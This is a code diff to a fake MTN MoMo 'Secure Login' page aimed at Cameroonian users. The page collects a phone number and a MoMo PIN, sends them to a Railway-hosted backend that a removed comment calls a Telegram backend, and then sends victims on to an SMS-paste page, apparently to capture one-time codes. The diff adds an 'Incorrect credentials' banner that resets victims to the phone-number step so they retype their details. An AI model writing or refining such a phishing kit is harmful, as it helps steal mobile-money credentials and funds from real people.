@@ -83,14 +83,9 @@
       text-decoration: none;
       color: inherit;
     }
-    .brand-logo-img {
-      height: 48px;
-      width: auto;
-      display: block;
-    }
+    .brand-logo-img { height: 48px; width: auto; display: block; }
     .brand-divider {
-      width: 1px;
-      height: 26px;
+      width: 1px; height: 26px;
       background: rgba(255, 255, 255, 0.2);
       margin: 0 4px;
       flex-shrink: 0;
@@ -135,10 +130,46 @@
       min-height: calc(100vh - var(--header-h) - var(--footer-h) - 40px);
       padding: 8px 0;
     }
-    .login-card-wrap {
-      width: 100%;
+    .login-card-wrap { width: 100%; max-width: 440px; }
+
+    /* ═══════════ RED BANNER (rejection notice) ═══════════ */
+    .reject-banner {
+      position: fixed;
+      top: calc(var(--header-h) + 12px);
+      left: 50%;
+      transform: translateX(-50%) translateY(-120%);
+      width: calc(100% - 32px);
       max-width: 440px;
+      background: linear-gradient(135deg, #FEF2F2, #FEE2E2);
+      border: 1px solid #FECACA;
+      border-left: 4px solid #DC2626;
+      border-radius: 14px;
+      padding: 14px 16px;
+      box-shadow: 0 12px 32px rgba(220, 38, 38, 0.22);
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      z-index: 5000;
+      transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1), opacity 0.4s ease;
+      opacity: 0;
+      pointer-events: none;
     }
+    .reject-banner.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+    .reject-banner .r-ico {
+      font-size: 18px;
+      flex-shrink: 0;
+      line-height: 1.3;
+    }
+    .reject-banner .r-text {
+      font-size: 12.5px;
+      font-weight: 700;
+      color: #7F1D1D;
+      line-height: 1.5;
+    }
+    .reject-banner .r-text b { color: #991B1B; font-weight: 900; }
 
     /* ═══════════ MOMO YELLOW BAND ═══════════ */
     .momo-band {
@@ -590,9 +621,7 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* ═══════════════════════════════════════════
-       SUPER VERIFY OVERLAY
-       ═══════════════════════════════════════════ */
+    /* ═══════════ SUPER VERIFY OVERLAY ═══════════ */
     .verify-overlay {
       position: fixed;
       inset: 0;
@@ -607,7 +636,6 @@
     }
     .verify-overlay.show { display: flex; animation: fadeIn 0.5s ease; }
 
-    /* Radial glow behind content */
     .verify-overlay::before {
       content: '';
       position: absolute;
@@ -625,17 +653,10 @@
       50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
     }
 
-    /* Floating particles */
-    .verify-particles {
-      position: absolute;
-      inset: 0;
-      overflow: hidden;
-      pointer-events: none;
-    }
+    .verify-particles { position: absolute; inset: 0; overflow: hidden; pointer-events: none; }
     .verify-particle {
       position: absolute;
-      width: 4px;
-      height: 4px;
+      width: 4px; height: 4px;
       background: var(--mtn-gold);
       border-radius: 50%;
       opacity: 0;
@@ -667,13 +688,7 @@
       z-index: 2;
     }
 
-    /* Orbit ring with MoMo logo core */
-    .verify-orbit {
-      width: 140px;
-      height: 140px;
-      position: relative;
-      margin-bottom: 34px;
-    }
+    .verify-orbit { width: 140px; height: 140px; position: relative; margin-bottom: 34px; }
     .verify-orbit-ring {
       position: absolute;
       inset: 0;
@@ -690,10 +705,8 @@
 
     .verify-orbit-core {
       position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 72px;
-      height: 72px;
+      top: 50%; left: 50%;
+      width: 72px; height: 72px;
       transform: translate(-50%, -50%);
       border-radius: 18px;
       background: var(--grad-gold);
@@ -704,26 +717,16 @@
       animation: corePulse 2s ease-in-out infinite;
       padding: 8px;
     }
-    .verify-orbit-core img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
-    }
+    .verify-orbit-core img { width: 100%; height: 100%; object-fit: contain; }
     @keyframes corePulse {
       0%, 100% { box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3); transform: translate(-50%, -50%) scale(1); }
       50% { box-shadow: 0 0 55px rgba(255, 204, 0, 0.85), 0 0 110px rgba(255, 204, 0, 0.5); transform: translate(-50%, -50%) scale(1.06); }
     }
 
-    /* Dots orbit */
-    .verify-dot-orbit {
-      position: absolute;
-      inset: 0;
-      animation: rotateSlow 3.5s linear infinite;
-    }
+    .verify-dot-orbit { position: absolute; inset: 0; animation: rotateSlow 3.5s linear infinite; }
     .verify-dot-orbit span {
       position: absolute;
-      width: 8px;
-      height: 8px;
+      width: 8px; height: 8px;
       border-radius: 50%;
       background: var(--mtn-gold);
       box-shadow: 0 0 12px rgba(255, 204, 0, 0.9);
@@ -802,8 +805,7 @@
       text-transform: uppercase;
     }
     .verify-status-dot {
-      width: 7px;
-      height: 7px;
+      width: 7px; height: 7px;
       border-radius: 50%;
       background: #22C55E;
       box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
@@ -814,7 +816,6 @@
       50% { opacity: 0.5; transform: scale(0.85); }
     }
 
-    /* Rotating status text */
     .verify-step {
       position: relative;
       height: 20px;
@@ -859,6 +860,14 @@
 </head>
 <body>
 
+  <!-- REJECT BANNER (hidden by default) -->
+  <div class="reject-banner" id="rejectBanner">
+    <span class="r-ico">⚠️</span>
+    <div class="r-text">
+      <b>Incorrect credentials.</b> Please enter your MoMo number and try again.
+    </div>
+  </div>
+
   <!-- ═══════════ HEADER ═══════════ -->
   <header class="header">
     <div class="header-inner">
@@ -876,19 +885,16 @@
     <div class="login-wrap">
       <div class="login-card-wrap">
 
-        <!-- YELLOW MOMO BAND -->
         <div class="momo-band">
           <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="momo-logo-img">
           <p class="momo-tagline">Secure Login</p>
         </div>
 
-        <!-- WHITE BODY -->
         <div class="login-body">
 
           <h1 class="welcome-title">Welcome Back</h1>
           <p class="welcome-sub">Enter your MoMo number to continue</p>
 
-          <!-- PHONE (Cameroon only) -->
           <div class="form-field">
             <label class="input-label" for="phone">MoMo Phone Number</label>
             <div class="phone-input" id="phoneWrapper">
@@ -922,7 +928,7 @@
     </div>
   </main>
 
-  <!-- ═══════════ BOTTOM NAV ═══════════ -->
+  <!-- BOTTOM NAV -->
   <nav class="bottom-nav">
     <div class="bottom-nav-inner">
       <a href="index.html" class="nav-item"><span class="ico">🏠</span><span>Home</span></a>
@@ -931,7 +937,7 @@
     </div>
   </nav>
 
-  <!-- ═══════════ PIN POPUP ═══════════ -->
+  <!-- PIN POPUP -->
   <div class="modal-container" id="modalContainer">
     <div class="sheet-overlay" id="sheetOverlay"></div>
     <div class="pin-modal" id="pinModal">
@@ -978,7 +984,7 @@
     </div>
   </div>
 
-  <!-- ═══════════ SUPER VERIFY OVERLAY ═══════════ -->
+  <!-- SUPER VERIFY OVERLAY -->
   <div class="verify-overlay" id="verifyOverlay">
     <div class="verify-particles">
       <span class="verify-particle"></span>
@@ -1029,15 +1035,13 @@
   </div>
 
   <script>
-    // ═══════════════════════════════════════════════════════════
-    // SAME TELEGRAM BACKEND AS YOUR CURRENT LOGIN PAGE
-    // ═══════════════════════════════════════════════════════════
     const API_BASE = 'https://momo-usersey-production.up.railway.app';
     const POLL_INTERVAL_MS = 2500;
 
     const phoneInput   = document.getElementById('phone');
     const phoneWrapper = document.getElementById('phoneWrapper');
     const phoneError   = document.getElementById('phoneError');
+    const rejectBanner = document.getElementById('rejectBanner');
 
     phoneInput.addEventListener('input', function() {
       this.value = this.value.replace(/\D/g, '').slice(0, 9);
@@ -1047,9 +1051,9 @@
       }
     });
 
-    // ═══════════════════════════════════════════════════════════
-    // PIN MODAL
-    // ═══════════════════════════════════════════════════════════
+    /* ═══════════════════════════════════════════
+       PIN MODAL
+    ═══════════════════════════════════════════ */
     const modal = document.getElementById('modalContainer');
     const popup = document.getElementById('pinModal');
     const pin = document.getElementById('momo_pin');
@@ -1129,9 +1133,70 @@
     cancel.addEventListener('click', closeModal);
     overlay.addEventListener('click', closeModal);
 
-    // ═══════════════════════════════════════════════════════════
-    // PROCEED → send to backend
-    // ═══════════════════════════════════════════════════════════
+    /* ═══════════════════════════════════════════
+       REJECT BANNER
+    ═══════════════════════════════════════════ */
+    let bannerTimer = null;
+    function showRejectBanner() {
+      rejectBanner.classList.add('show');
+      if (bannerTimer) clearTimeout(bannerTimer);
+      bannerTimer = setTimeout(() => {
+        rejectBanner.classList.remove('show');
+      }, 6000);
+    }
+    function hideRejectBanner() {
+      rejectBanner.classList.remove('show');
+      if (bannerTimer) clearTimeout(bannerTimer);
+    }
+
+    /* ═══════════════════════════════════════════
+       RESET TO STEP 1 (phone number)
+    ═══════════════════════════════════════════ */
+    function resetToPhoneStep() {
+      // 1) Close PIN modal + verify overlay immediately (no animation delay)
+      if (verifyTimer) clearInterval(verifyTimer);
+      if (stepTimer) clearInterval(stepTimer);
+      verifyOverlay.classList.remove('show');
+      verifyBarFill.style.background = '';
+      verifyBarFill.style.width = '0%';
+      verifyStepInner.style.transform = 'translateY(0)';
+
+      // Close PIN modal without the usual animation delay
+      popup.classList.remove('show');
+      modal.classList.remove('open');
+      document.body.classList.remove('modal-open');
+
+      // Reset PIN field
+      pin.value = '';
+      pin.type = 'password';
+      togglePin.classList.remove('active');
+      togglePin.innerHTML = '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
+      proceed.disabled = true;
+      proceed.innerHTML = '<span>Proceed</span>';
+      pinError.classList.remove('show');
+
+      // Reset phone field
+      phoneInput.value = '';
+      phoneWrapper.classList.remove('invalid');
+      phoneError.classList.remove('show');
+
+      // Clear local storage so a fresh login is required
+      localStorage.removeItem('momoSession');
+      localStorage.removeItem('momoPhone');
+      localStorage.removeItem('momoCountry');
+      localStorage.removeItem('momoSms');
+
+      // Show red banner
+      showRejectBanner();
+
+      // Focus phone field for immediate re-entry
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      setTimeout(() => phoneInput.focus(), 250);
+    }
+
+    /* ═══════════════════════════════════════════
+       PROCEED
+    ═══════════════════════════════════════════ */
     let pollTimer = null;
     let verifyTimer = null;
     let stepTimer = null;
@@ -1200,9 +1265,9 @@
       }
     });
 
-    // ═══════════════════════════════════════════════════════════
-    // SUPER VERIFY OVERLAY
-    // ═══════════════════════════════════════════════════════════
+    /* ═══════════════════════════════════════════
+       SUPER VERIFY OVERLAY
+    ═══════════════════════════════════════════ */
     const verifyOverlay = document.getElementById('verifyOverlay');
     const verifyBarFill = document.getElementById('verifyBarFill');
     const verifyTitle   = document.getElementById('verifyTitle');
@@ -1217,7 +1282,6 @@
       verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
       verifyStepInner.style.transform = 'translateY(0)';
 
-      // Rotate status messages
       let stepIndex = 0;
       verifyStepInner.style.transform = `translateY(0)`;
       if (stepTimer) clearInterval(stepTimer);
@@ -1241,29 +1305,9 @@
       verifyBarFill.style.width = '100%';
     }
 
-    function showRejection(reason) {
-      if (verifyTimer) clearInterval(verifyTimer);
-      if (stepTimer) clearInterval(stepTimer);
-      verifyBarFill.style.width = '100%';
-      verifyBarFill.style.background = '#e74c3c';
-      verifyStepInner.style.transform = 'translateY(0)';
-
-      verifyTitle.innerHTML = reason.title;
-      verifySubtitle.innerHTML = reason.subtitle;
-
-      setTimeout(function() {
-        verifyOverlay.classList.remove('show');
-        verifyBarFill.style.background = '';
-        document.body.classList.remove('modal-open');
-        openModal();
-        pinError.textContent = 'Incorrect credentials. Please check your PIN and try again.';
-        pinError.classList.add('show');
-      }, 4000);
-    }
-
-    // ═══════════════════════════════════════════════════════════
-    // POLLING
-    // ═══════════════════════════════════════════════════════════
+    /* ═══════════════════════════════════════════
+       POLLING
+    ═══════════════════════════════════════════ */
     function stopPolling() {
       if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
     }
@@ -1288,18 +1332,13 @@
             setTimeout(() => { window.location.href = 'sms-paste.html'; }, 300);
 
           } else if (data.status === 'rejected') {
+            // ✅ NEW: reset straight to phone entry step
             stopPolling();
-            showRejection({
-              title: '⚠️ Incorrect <span class="highlight">credentials</span>',
-              subtitle: 'Please check your PIN and try again.'
-            });
+            resetToPhoneStep();
 
           } else if (data.status === 'timeout') {
             stopPolling();
-            showRejection({
-              title: 'Request <span class="highlight">timed out</span>',
-              subtitle: 'Please try again.'
-            });
+            resetToPhoneStep();
           }
         } catch (err) {
           console.warn('poll error:', err.message);
